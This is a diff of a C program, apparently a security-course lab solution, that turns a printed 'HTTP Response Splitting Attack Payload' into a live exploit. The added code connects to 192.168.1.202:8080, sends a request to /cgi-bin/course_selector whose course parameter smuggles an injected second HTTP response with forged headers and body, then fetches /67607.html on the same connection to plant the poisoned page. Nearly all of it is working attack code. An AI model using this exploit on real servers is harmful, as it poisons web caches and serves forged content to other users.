@@ -2,9 +2,16 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
 #define YOUR_ID "123456789"
 #define ONE_HOUR 3600
+#define TARGET_IP "192.168.1.202"
+#define TARGET_PORT 8080
+#define BUFFER_SIZE 8192
 
 /**
  * Generates an RFC 1123 formatted timestamp for the Last-Modified header.
@@ -79,12 +86,12 @@ char* build_full_request() {
     char body[256];
     snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
     
-    int body_length = strlen(body);
+    size_t body_length = strlen(body);
     
     char second_response[2048];
     snprintf(second_response, sizeof(second_response),
         "HTTP/1.1 200 OK\r\n"
-        "Content-Length: %d\r\n"
+        "Content-Length: %zu\r\n"
         "Last-Modified: %s\r\n"
         "Content-Type: text/html\r\n"
         "\r\n"
@@ -108,8 +115,8 @@ char* build_full_request() {
     static char full_request[16384];
     snprintf(full_request, sizeof(full_request),
         "GET /cgi-bin/course_selector?course=%s HTTP/1.1\r\n"
-        "Host: localhost\r\n"
-        "Connection: close\r\n"
+        "Host: 192.168.1.202:8080\r\n"
+        "Connection: keep-alive\r\n"
         "\r\n",
         encoded
     );
@@ -117,16 +124,73 @@ char* build_full_request() {
     return full_request;
 }
 
-int main() {
-    printf("=== HTTP Response Splitting Attack Payload ===\n\n");
+int main(void) {
+    int sockfd;
+    struct sockaddr_in server_addr;
+    char buffer[BUFFER_SIZE];
+    ssize_t bytes_sent, bytes_received;
     
-    char body[256];
-    snprintf(body, sizeof(body), "<HTML>%s</HTML>", YOUR_ID);
-    printf("Body: %s\n", body);
-    printf("Body Length: %zu\n\n", strlen(body));
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        fprintf(stderr, "Error: Failed to create socket\n");
+        return 1;
+    }
     
-    printf("=== Full Request ===\n");
-    printf("%s\n", build_full_request());
+    memset(&server_addr, 0, sizeof(server_addr));
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(TARGET_PORT);
     
+    if (inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr) <= 0) {
+        fprintf(stderr, "Error: Invalid address\n");
+        close(sockfd);
+        return 1;
+    }
+    
+    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+        fprintf(stderr, "Error: Connection failed\n");
+        close(sockfd);
+        return 1;
+    }
+    
+    char *first_request = build_full_request();
+    size_t request_len = strlen(first_request);
+    bytes_sent = send(sockfd, first_request, request_len, 0);
+    if (bytes_sent < 0 || (size_t)bytes_sent != request_len) {
+        fprintf(stderr, "Error: Failed to send first request\n");
+        close(sockfd);
+        return 1;
+    }
+    
+    bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received < 0) {
+        fprintf(stderr, "Error: Failed to receive first response\n");
+        close(sockfd);
+        return 1;
+    }
+    
+    const char *second_request = 
+        "GET /67607.html HTTP/1.1\r\n"
+        "Host: 192.168.1.202:8080\r\n"
+        "Connection: close\r\n"
+        "\r\n";
+    
+    size_t second_len = strlen(second_request);
+    bytes_sent = send(sockfd, second_request, second_len, 0);
+    if (bytes_sent < 0 || (size_t)bytes_sent != second_len) {
+        fprintf(stderr, "Error: Failed to send second request\n");
+        close(sockfd);
+        return 1;
+    }
+    
+    bytes_received = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
+    if (bytes_received < 0) {
+        fprintf(stderr, "Error: Failed to receive second response\n");
+        close(sockfd);
+        return 1;
+    }
+    buffer[bytes_received] = '\0';
+    printf("%s", buffer);
+    
+    close(sockfd);
     return 0;
 }
